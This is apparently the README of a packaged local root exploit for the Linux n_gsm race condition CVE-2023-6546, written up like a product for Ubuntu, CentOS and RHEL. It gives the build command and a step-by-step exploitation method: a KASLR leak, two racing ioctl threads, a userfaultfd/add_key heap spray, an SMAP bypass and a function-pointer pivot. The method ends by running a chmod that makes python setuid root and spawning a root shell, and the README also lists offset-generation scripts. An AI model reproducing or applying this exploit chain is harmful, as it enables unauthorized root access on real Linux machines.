Linux Kernel GSM Multiplexing Race Condition Local Privilege Escalation Vulnerability (CVE-2023-6546)

https://www.zerodayinitiative.com/advisories/ZDI-24-020/

This vulnerability allows local attackers to execute arbitrary code 
on affected installations of Linux Kernel. An attacker must first obtain
the ability to execute low-privileged code on the target system in 
order to exploit this vulnerability.


The specific flaw exists within the n_gsm driver. The issue results 
from the lack of proper locking when performing operations on an object.
An attacker can leverage this vulnerability to escalate privileges and 
execute code in the context of the kernel.

Overview
========
This is a custom exploit which targets Ubuntu 18.04+20.04 LTS/Centos 8/RHEL 8 to attain root privileges via arbitrary kernel code execution on SMP systems.

Features
========

Highlights of the significant features of ProductName include:

* Bypasses KASLR
* Bypasses SMAP/SMEP
* Supports Linux x86_64

Under Linux, ProductName gains root privileges.

Exploit 
===================

The exploit consists of a binary executable which exploits the vulnerability. 

| File Path       | Description                            |
|:---             |:--                                     |
| exploit.c       | The C file containing the exploit code |
| symbols         | Scripts for generating kernel offsets  |

When the exploit binary is run, it will attempt to exploit a race condition
and spawn a root shell. The exploit must be run on a multi-core system with SMP enabled.
Ideally at least 3 cores, but it will also work on dualcore systems, although runtime will
increase.

To set up a custom payload to execute as root, the PYTHON_PAYLOAD in exploit.c can be modified.

Build Process
=============

Compile exploit.c:
gcc exploit.c -o exploit -lpthread

Vulnerability Overview
----------------------

The vulnerability exploited is a race condition leading to a use-after-free 
on the kmalloc-1024 slab. The bug exists in the n_gsm tty line discipline, 
created for gsm modems.

The race condition results in a UAF on a struct gsm_dlci while restarting the 
gsm mux.

In linux 4.13 the timer interfaces changed slightly and workarounds were 
introduced in many parts of the code, including the n_gsm module, leading to 
the introduction of the gsm_disconnect function and a general restructuring of 
the mux restart code.

If two processes are going through the mux reset process at the same time,
we can trigger a use-after-free on the struct gsm_dlci object and gain 
code execution.

Exploitation Walkthrough
------------------------

#### Bypassing KASLR

By default, Ubuntu compiles in the Xen Paravirtualization feature.
This feature exposes a leak of the kernel text base via the "/sys/kernel/notes" file, which is world-readable. 

In *arch/x86/xen/xen-head.S:*
```c
#ifdef CONFIG_XEN_PV
        ELFNOTE(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)
#endif
```

#### Racing the mux restart

We spawn two threads that each trigger the ioctl GSMIOC_SETCONF on the same tty file descriptor
with the gsm line discipline enabled to trigger the race condition.

```c
static int gsmld_config(struct tty_struct *tty, struct gsm_mux *gsm,
                                                        struct gsm_config *c)
{
...
        if (need_close || need_restart) {
                int ret;

                ret = gsm_disconnect(gsm);

                if (ret)
                        return ret;
        }
        if (need_restart)
                gsm_cleanup_mux(gsm);
...
       if (need_restart)
                gsm_activate_mux(gsm);
...
}

```

Both threads enter gsm_disconnect.


```c
static int gsm_disconnect(struct gsm_mux *gsm)
{
        struct gsm_dlci *dlci = gsm->dlci[0];
        struct gsm_control *gc;

        if (!dlci)
                return 0;

        /* In theory disconnecting DLCI 0 is sufficient but for some
           modems this is apparently not the case. */
        gc = gsm_control_send(gsm, CMD_CLD, NULL, 0);
        if (gc)
                gsm_control_wait(gsm, gc); [1]

        del_timer_sync(&gsm->t2_timer);
        /* Now we are sure T2 has stopped */

        gsm_dlci_begin_close(dlci); [2]
        wait_event_interruptible(gsm->event,
                                dlci->state == DLCI_CLOSED); [3]

        if (signal_pending(current))
                return -EINTR;

        return 0;
}
```

The first thread gets stuck on [1], we let it go by responding to the control message and get stuck on [3].
The second thread gets stuck on [1].

We then let the first thread go by closing the dlci, and it goes on to gsm_cleanup.
We let the second thread go aswell by responding to it's control message,
but we keep it blocked in the wait by spinning on the same core so it won't get scheduled.
Unfortunately we can't hold off letting the second thread go, because the first thread
might end up resetting the wait queue and we would block forever.

```c
static void gsm_cleanup_mux(struct gsm_mux *gsm)
{
...
        mutex_lock(&gsm->mutex);
        for (i = 0; i < NUM_DLCI; i++)
                if (gsm->dlci[i])
                        gsm_dlci_release(gsm->dlci[i]);
        mutex_unlock(&gsm->mutex);
...
}
```

The first thread then goes ahead and frees dlci[0].

We then spray to fill that slab object and eventually the second thread gets scheduled again,
with a freed dlci object referenced.

The second thread executes [2].

```c
static void gsm_dlci_begin_close(struct gsm_dlci *dlci)
{
        struct gsm_mux *gsm = dlci->gsm;
        if (dlci->state == DLCI_CLOSED || dlci->state == DLCI_CLOSING) [4]
                return;
        dlci->retries = gsm->n2;
        dlci->state = DLCI_CLOSING;
        gsm_command(dlci->gsm, dlci->addr, DISC|PF); [5]
        mod_timer(&dlci->t1, jiffies + gsm->t1 * HZ / 100); [6]
}

static inline void gsm_command(struct gsm_mux *gsm, int addr, int control)
{
        gsm_send(gsm, addr, 1, control); [7]
}

static void gsm_send(struct gsm_mux *gsm, int addr, int cr, int control)
{
...
        gsm->output(gsm, cbuf, len); [8]
...
}
```

If the second thread woke up too early, hopefully [4] won't pass.

Through [7] and [8] we then get a controlled function pointer call.

We also try to avoid a crash at [6] by having the timer function
execute as soon as possible and call a dummy function.

#### Spraying with userfaultfd / add_key

By using userfaultfd we can effectively block copy_from_user operations in the kernel 
indefinitely when copying data over page boundaries.

We use this in conjunction with add_key to spray fake gsm_dlci objects.

```c
buf = mmap(NULL, 4096*2, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
memset(buf, 0x41, 4096);
...
reg.range.start = (unsigned long)buf;
reg.range.len = 4096*2;
...

if(ioctl(ufd_fd, UFFDIO_REGISTER, &reg)) die("UFFDIO_REGISTER"); [1]

syscall(__NR_add_key, "user", "wtf", buf + 4096 - 1023, 1024, -123); [2]

SYSCALL_DEFINE5(add_key, const char __user *, _type,
                const char __user *, _description,
                const void __user *, _payload,
                size_t, plen,
                key_serial_t, ringid)
{
...
	payload = kvmalloc(plen, GFP_KERNEL); [3]
	copy_from_user(payload, _payload, plen); [4]
...
}
```

At [1] we register a memory range for userfaultfd handling.
At [2] we pass the buffer into the syscall add_key.
At [3] we kmalloc a block with an user controlled length.
At [4] the data is copied in, but since the second page of the allocation is uninitialized, the syscall will block.

#### Bypassing SMAP
Since we need to know the address of our fake struct gsm_mux we use a global static buffer to store it.
By using iptables to add an invalid cgroup filter the buffer kernfs_pr_cont_buf gets filled with our
payload data.

#### The payload
When gsm->output(gsm, ...) gets called, we instead call
__rb_free_aux(gsm) by overriding that function pointer with our UAF.

This is a pivot to get an arbitrary function call with a controlled argument.

__rb_free_aux then calls ((struct ring_buffer*)gsm)->aux_free(((struct ring_buffer*)gsm)->aux_priv)
Which basically means we have a controlled call with a controlled argument, 
user_controlled1(user_controlled2).

We then call run_cmd("/bin/chmod u+s /usr/bin/python") to make the python interpreter setuid root.

Back in userland we then use the setuid python interpreter to do some cleanup and spawn a root shell.

Notes
===================

The following are some notes to help maintain the product.

The exploit has version and architecture specific offsets
which have to be updated for new kernel images.

These can be gathered from /proc/kallsyms of a running kernel, Symbol.map or directly from the kernel image.

We include a directory 'symbols' which contains scripts for generating offsets.

| File Path                      | Description                                        |
|:---                            |:--                                                 |
| download_pkgs_ubuntu_centos.py | Download kernel packages for ubuntu/centos         |
| download_pkgs_rhel.py          | Download kernel packages for RHEL                  |
| extract_syms_ubuntu.py         | Generate offsets from kernel packages for ubuntu   |
| extract_syms_redhat.py         | Generate offsets from kernel packages for redhat   |
| kallsyms.py                    | Generate offsets from kallsyms of a running system |
